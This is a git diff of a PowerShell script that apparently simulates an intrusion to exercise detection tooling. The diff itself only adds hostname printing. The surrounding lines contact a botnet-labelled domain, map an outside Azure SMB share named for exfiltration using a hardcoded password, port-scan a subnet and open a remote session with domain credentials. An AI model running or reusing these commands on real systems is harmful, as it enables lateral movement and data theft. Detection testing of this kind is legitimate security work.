@@ -4,6 +4,9 @@ $domain = "examplebotnetdomain.com"
 # HTTP web request
 Invoke-WebRequest $domain
 
+# Print hostname
+$env:computername
+
 # Extfiltrate file
 # Create new file share link
 New-SmbMapping -RemotePath '\\xdr-datastorehost.westeurope.cloudapp.azure.com\exfilFiles' -UserName 'exfil' -Password 'C1sco12345' -LocalPath 'Z:'
@@ -19,6 +22,9 @@ Invoke-PSnmap -Cn 10.200.200.0/24 -ScanOnPingFail -Port 443, 3389, 22, 5985, 598
 
 # Connect to remote device
 Enter-PSSession 10.200.200.70 -Credential securex.local\david.altass
+
+# Print hostname
+$env:computername
 
 # Exfiltrate file
 # Create new file share link
